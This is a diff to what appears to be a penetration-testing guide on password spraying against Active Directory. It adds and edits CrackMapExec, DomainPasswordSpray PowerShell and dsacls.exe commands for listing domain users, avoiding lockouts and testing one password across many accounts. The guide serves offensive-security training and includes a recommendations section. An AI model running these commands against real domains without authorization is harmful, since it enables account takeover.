@@ -38,10 +38,13 @@ To perform password spraying on a domain, target a domain controller or a domain
 
 ```bash
 # From Kali.
-cme smb $DC_IP -d $DOMAIN -u $USERNAME -p $PASSWORD --users
+cme smb $dc_ip -d $domain -u $username -p $password --users
 
 # From a domain joined Windows computer.
 net user /domain
+
+# From a domain joined computer with DomainPasswordSpray PowerShell module.
+Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
 ```
 
 Otherwise, you can use OSINT tools like [linkedin2username](https://github.com/initstring/linkedin2username) to generate username lists.
@@ -50,16 +53,20 @@ Usernames often have the same nomenclature like `f.lastname` or `firstname.lastn
 
 ```bash
 # Try the same password for every username.
-cme smb $TARGET -d $DOMAIN -u usernames.txt -p $PASSWORD
+cme smb $target -d $domain -u usernames.txt -p $password
 
 # Try multiple passwords for every username.
-cme smb $TARGET -d $DOMAIN -u usernames.txt -p passwords.txt
+cme smb $target -d $domain -u usernames.txt -p passwords.txt
 
 # Try line by line (username1 with password1, username2 with password2, etc.).
-cme smb $TARGET -d $DOMAIN -u usernames.txt -p passwords.txt --no-bruteforce
-```
+cme smb $target -d $domain -u usernames.txt -p passwords.txt --no-bruteforce
 
-From a domain joined computer, you can use [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) which automatically generates the usernames list from the domain.
+# From a domain joined computer with DomainPasswordSpray PowerShell module.
+Invoke-DomainPasswordSpray -Password $password
+
+# From a domain joined computer using dsacls.exe built-in binary.
+dsacls.exe "$distinguishedname" /user:$username@$domain /passwd:$password
+```
 
 ## Recommendations
 
